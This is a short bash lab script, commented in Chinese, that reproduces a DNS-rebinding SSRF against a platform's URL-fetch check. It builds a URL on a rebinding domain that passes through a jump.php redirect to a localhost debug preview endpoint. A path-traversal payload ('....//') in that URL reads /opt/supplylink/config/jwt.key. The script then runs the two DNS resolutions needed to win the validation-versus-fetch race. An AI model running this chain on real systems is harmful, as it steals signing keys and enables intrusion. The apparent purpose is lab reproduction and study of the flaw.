#!/usr/bin/env bash
# 复现平台抓取行为（校验 + 抓取两次解析），用于观察 rebinding 时序
# 用法: bash lab/fetch_test.sh   （实验环境需已启动）
REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SUB="t$(date +%s)"
URL="http://${SUB}.cache.rebind.huanyutech.cn:8080/jump.php?url=http%3A%2F%2F127.0.0.1%3A8081%2Fdebug%2Fpreview.php%3Ffile%3D....%2F%2F....%2F%2F....%2F%2Fopt%2Fsupplylink%2Fconfig%2Fjwt.key"
echo "测试 URL: $URL"
echo "--- 模拟校验（第 1 次解析）---"
php -r "var_export(array_column(dns_get_record('${SUB}.cache.rebind.huanyutech.cn', DNS_A), 'ip')); echo PHP_EOL;"
echo "--- 模拟抓取（第 2 次解析 + 真实请求）---"
php "$REPO_ROOT/lab/fetch_test.php" "$URL"
